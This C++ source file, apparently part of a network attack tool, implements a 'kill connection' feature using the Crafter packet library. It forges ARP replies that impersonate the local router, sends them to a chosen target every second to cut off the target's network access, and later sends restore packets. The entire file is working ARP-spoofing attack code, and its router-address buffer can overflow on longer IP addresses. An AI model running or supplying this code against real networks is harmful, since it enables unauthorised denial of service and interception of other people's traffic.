using namespace std;
using namespace Crafter;

static bool single_arp_spoof_cont = true;

struct single_spoof_infos
{
    string iface;
    string IP_attacker;
    string IP_target;
    string MAC_attacker;
    string MAC_target;
    Packet arp_request_to_send;
};

void *single_arp_spoof(void *arg)
{
    single_spoof_infos *spoof_infos = static_cast<single_spoof_infos*>(arg);
    Packet *packet = &spoof_infos->arp_request_to_send;
    unsigned int counter = 0;
    while(single_arp_spoof_cont)
    {
        packet->Send(spoof_infos->iface);
        sleep(1);
        counter++;
    }
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] " << counter << " packets sent" << endl;
    pthread_exit(NULL);
}

void kill_connection(const string iface)
{
    bool valid_address = false;
    int dot_counter = 0;
    string target_ip = "", target_mac = "";
    const string myMAC = GetMyMAC(iface);
    char router_ip[13] = "";
    single_spoof_infos spoof_infos{};
    spoof_infos.iface = iface;
    spoof_infos.IP_attacker = GetMyIP(iface);
    spoof_infos.MAC_attacker = GetMyMAC(iface);

    cout << endl << "========== " << MENU_COLOR << "Kill a specific connection" << NORMAL_COLOR << " ==========" << endl << endl;

    cout << "Enter the IP address to kill (type \"c\" to cancel) :" << endl;
    do
    {
        cout << "> ";
        getline(cin, target_ip);
        if(target_ip == "c" || target_ip == "C") return;
        if(target_ip.empty()) cout << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Incorrect IP address" << endl;
        else valid_address = true;
    }while(!valid_address);


    for(unsigned int i = 0; i < target_ip.size(); i++)
    {
        if(target_ip[i] != '.')
            router_ip[i] = target_ip[i];
        else
        {
            router_ip[i] = '.';
            dot_counter++;
            if(dot_counter == 3)
            {
                router_ip[i+1] = '1';
                break;
            }
        }
    }
    const string router_MAC = GetMAC(router_ip, iface);
    if(router_MAC.empty())
    {
        cout << endl << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Router not responding or invalid address, cancel..." << endl << endl;
        return;
    }
    cout << endl << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] IP router is : " << router_ip << endl;
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] MAC router is : " << router_MAC << endl;
    spoof_infos.IP_target = target_ip;


    cout << endl << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Create falsified ARP reply..." << endl;
    Ethernet ether_header;
    ether_header.SetSourceMAC(myMAC);
    if((target_mac = GetMAC(target_ip, iface)) == "")
    {
        cout << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] IP address not responding to ARP request" << endl << endl;
        return;
    }
    spoof_infos.MAC_target = target_mac;
    ether_header.SetDestinationMAC(target_mac);
    ARP arp_header;
    arp_header.SetOperation(ARP::Reply);
    arp_header.SetSenderIP(router_ip);
    arp_header.SetSenderMAC(myMAC);
    arp_header.SetTargetIP(target_ip);
    arp_header.SetTargetMAC(target_mac);
    Packet packet(ether_header / arp_header);
    spoof_infos.arp_request_to_send = packet;

    pthread_t spoofThread;
    pthread_create(&spoofThread, NULL, single_arp_spoof, (void*)&spoof_infos);
    cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Thread process, connetion theoretically " << SUCCESS_COLOR << "killed" << NORMAL_COLOR << endl;
    cout << "Press \"Enter\" to undone" << endl;
    getchar();
    single_arp_spoof_cont = false;

    //Arrêt du thread
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Thread canceled, restore connection..." << endl;
    ether_header.SetSourceMAC(router_MAC);
    arp_header.SetSenderMAC(router_MAC);
    Packet restore_packet(ether_header / arp_header);
    for(int i = 0; i < 5; i++)
    {
        restore_packet.Send(iface);
        sleep(1);
    }
    cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Connection restored" << endl << endl;
}
